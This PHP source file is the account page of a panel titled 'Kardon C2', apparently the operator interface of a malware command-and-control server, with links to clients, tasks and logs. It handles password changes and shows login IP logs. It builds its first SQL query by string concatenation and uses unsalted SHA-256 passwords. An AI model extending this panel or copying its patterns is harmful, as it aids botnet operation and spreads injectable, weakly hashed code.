<?php
    include '../inc/session.php';
    include '../inc/stats.php';
    include '../inc/geo.php';  
    $userperms = $odb->query("SELECT privileges FROM users WHERE username = '".$username."'")->fetchColumn(0);  
?>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="A front-end template that helps you build fast, modern mobile web apps.">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <title>Kardon C2</title>
    <meta name="mobile-web-app-capable" content="yes">
    <link rel="icon" sizes="192x192" href="../img/android-desktop.png">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-title" content="Material Design Lite">
    <link rel="apple-touch-icon-precomposed" href="../img/ios-desktop.png">
    <meta name="msapplication-TileImage" content="../img/touch/ms-touch-icon-144x144-precomposed.png">
    <meta name="msapplication-TileColor" content="#3372DF">
    <link rel="shortcut icon" href="../img/favicon.png">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:regular,bold,italic,thin,light,bolditalic,black,medium&amp;lang=en">
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <link rel="stylesheet" href="https://code.getmdl.io/1.3.0/material.cyan-light_blue.min.css">
    <link rel="stylesheet" href="../css/styles.css">
    <style>
    #view-source {
      position: fixed;
      display: block;
      right: 0;
      bottom: 0;
      margin-right: 40px;
      margin-bottom: 40px;
      z-index: 900;
    }
    label {
      font-family: "Roboto","Helvetica","Arial",sans-serif;
      font-size: 13px;
      line-height: 1;
      letter-spacing: .02em;
      font-weight: 400;
      box-sizing: border-box;
      color: #757575
    }
    h6 {
      font-family: "Roboto","Helvetica","Arial",sans-serif;
      font-size: 18px;
      line-height: 1;
      letter-spacing: .02em;
      font-weight: 400;
      box-sizing: border-box;
      color: #757575
    }
    </style>
  </head>
  <body>
    <div class="demo-layout mdl-layout mdl-js-layout mdl-layout--fixed-drawer mdl-layout--fixed-header">
      <header class="demo-header mdl-layout__header mdl-color--grey-100 mdl-color-text--grey-600">
        <div class="mdl-layout__header-row">
          <span class="mdl-layout-title">
          Account
          </span>
          <div class="mdl-layout-spacer"></div>
          <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" id="hdrbtn">
            <i class="material-icons">more_vert</i>
          </button>
          <ul class="mdl-menu mdl-js-menu mdl-js-ripple-effect mdl-menu--bottom-right" for="hdrbtn">
            <li onclick="location.href = 'account.php';" class="mdl-menu__item">Account</li>
            <li onclick="location.href = 'settings.php';"class="mdl-menu__item">Settings</li>
            <li onclick="location.href = '../inc/logout.php?logout';"class="mdl-menu__item">Logout</li>
          </ul>
        </div>
      </header>
      <div class="demo-drawer mdl-layout__drawer mdl-color--blue-grey-900 mdl-color-text--blue-grey-50">
      <header class="demo-drawer-header">
          <img src="../img/user.jpg" class="demo-avatar">
          <div class="demo-avatar-dropdown">
            <span><br /><?php echo $username; ?></span>
            <div class="mdl-layout-spacer"></div>
            <button id="accbtn" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
              <i class="material-icons" role="presentation">arrow_drop_down</i>
              <span class="visuallyhidden">Manage Users</span>
            </button>
            <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="accbtn">
              <li onclick="location.href = 'users.php';" class="mdl-menu__item">Manage Users</li>
            </ul>
          </div>
        </header>
        <nav class="demo-navigation mdl-navigation mdl-color--blue-grey-800">
        <a class="mdl-navigation__link" href="index.php">   <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">dashboard</i>Dashboard</a>
        <a class="mdl-navigation__link" href="clients.php"> <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">computer</i>Clients</a>
          <a class="mdl-navigation__link" href="tasks.php">   <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">schedule</i>Tasks</a>
          <a class="mdl-navigation__link" href="logs.php">    <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">list</i>Logs</a>
        </nav>
      </div>
      <main class="mdl-layout__content mdl-color--grey-100">
        <div class="mdl-grid demo-content">
            <?php
                if (isset($_POST['doChange']))
                {
                    $oldpass = $_POST['oldpass'];
                    $newpass = $_POST['newpass'];
                    $newpas2 = $_POST['newpass2'];
                    if (empty($oldpass) || empty($newpass) || empty($newpas2))
                    {
                        echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col"><center><h6><font style="color: #F44336;">One of the fields were empty.</font></h6></center></div>';
                    }else{
                        if ($newpass == $newpas2)
                        {
                            $oh = hash("sha256", $oldpass);
                            $op_sql = $odb->prepare("SELECT password FROM users WHERE username = :u");
                            $op_sql->execute(array(":u" => $username));
                            $op = $op_sql->fetchColumn(0);
                            if ($oh == $op)
                            {
                                $nh = hash("sha256", $newpass);
                                $up = $odb->prepare("UPDATE users SET password = :p WHERE username = :u");
                                $up->execute(array(":p" => $nh, ":u" => $username));
                                echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col"><center><h6><font style="color: #4CAF50;">Password has been changed successfully. Reloading...</font></h6></center></div><meta http-equiv="refresh" content="2">';
                            }else{
                                echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col"><center><h6><font style="color: #F44336;">Current password was incorrect.</font></h6></center></div>';
                            }
                        }else{
                            echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col"><center><h6><font style="color: #F44336;">New password did not match.</font></h6></center></div>';
                        }
                    }
                }
            ?>
            <div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col">
                <center>
                    <?php
                    $ls = $odb->prepare("SELECT ipaddress FROM plogs WHERE username = :u ORDER BY date DESC LIMIT 1");
                    $ls->execute(array(":u" => $username));
                    $l = $ls->fetchColumn(0);
                    $cn = countryCodeToCountry(ip_info($l, "Country Code"));
                    $fl = strtolower(ip_info($l, "Country Code"));
                    if ($l == "" || $l == NULL)
                    {
                        $l = "Unknown";
                    }else{
                        $l .= '&nbsp;<img src="../img/flags/'.$fl.'.png">';
                    }
                    ?>
                    <h6>Last Known IP: <b><?php echo $l; ?></b></h6>
                    <h6>Current Perms: <b><?php echo $userperms ?> </b></h6>
                </center>
            </div>
            <div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--6-col">
                <center>
                    <h6>Change Password</h6>
                    <br>
                    <form action="" method="POST">
                        <label>Current Password</label>
                        <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label"><input class="mdl-textfield__input" type="password" name="oldpass"></div>
                        <br>
                        <label>New Password</label>
                        <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label"><input class="mdl-textfield__input" type="password" name="newpass"></div>
                        <br>
                        <label>New Password Confirm</label>
                        <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label"><input class="mdl-textfield__input" type="password" name="newpass2"></div>
                        <br><br>
                        <center><input type="submit" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-color--red-400" name="doChange" value="Change Password"></center>
                    </form>
                </center>
            </div>
            <div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--6-col">
                <center>
                    <h6>Last 5 Logs</h6>
                    <br>
                    <table class="mdl-data-table mdl-js-data-table mdl-data-table mdl-shadow--2dp">
                        <thead>
                            <tr>
                                <th>#</th>
                                <th>IP Address</th>
                                <th>Action</th>
                                <th>Date</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php
                            $lgs = $odb->prepare("SELECT * FROM plogs WHERE username = :u ORDER BY date DESC LIMIT 5");
                            //$csel = $odb->prepare("SELECT country, COUNT(*) AS cnt FROM plogs WHERE username = :u GROUP BY country ORDER BY cnt DESC LIMIT 3");
                            //$csel->execute(array(":u" => $username));
                            $lgs->execute(array(":u" => $username));
                            while ($lg = $lgs->fetch(PDO::FETCH_ASSOC))
                            {
                                $country = ip_info($lg['ipaddress'], "Country Code");
                                $fl = strtolower($country);
                                echo '
                                <tr>
                                <td class="mdl-data-table__cell--non-numeric">'.$lg['id'].'</td>
                                <td class="mdl-data-table__cell--non-numeric">'.$lg['ipaddress'].'&nbsp;<img src="../img/flags/'.$fl.'.png"></td>
                                <td class="mdl-data-table__cell--non-numeric">'.$lg['action'].'</td>
                                <td class="mdl-data-table__cell--non-numeric">'.date("m-d-Y, h:i A", $lg['date']).'</td>
                                </tr>
                                ';
                            }
                            ?>
                        </tbody>
                    </table>
                    <br>
                </center>
            </div>
        </div>
      </main>
    </div>
    <script src="https://code.getmdl.io/1.3.0/material.min.js"></script>
  </body>
</html>
